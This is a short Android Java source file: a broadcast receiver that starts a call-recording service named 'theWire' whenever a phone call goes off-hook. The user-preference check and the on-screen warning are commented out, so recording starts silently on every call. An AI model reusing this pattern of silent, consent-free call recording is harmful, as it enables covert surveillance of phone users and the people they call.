package com.call.log.record;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;


	public class admin extends BroadcastReceiver {

		@Override
		public void onReceive(Context context, Intent intent) {
//			SharedPreferences sharedPreferences = PreferenceManager
//	                .getDefaultSharedPreferences(context.getApplicationContext());
//	        boolean checkBoxValue = sharedPreferences.getBoolean("check", true);
//	        boolean warning = sharedPreferences.getBoolean("warning", true);
	        
	        
			TelephonyManager manager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			
			switch(manager.getCallState()){
			
				case TelephonyManager.CALL_STATE_OFFHOOK:
					
					
//					if(checkBoxValue){
//					if(warning){	
//					Toast.makeText(context.getApplicationContext(),"starting", Toast.LENGTH_SHORT).show();	
//					}
					context.startService(new Intent(context, com.call.log.record.theWire.class).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
					
					break;
				
			}}
		
}
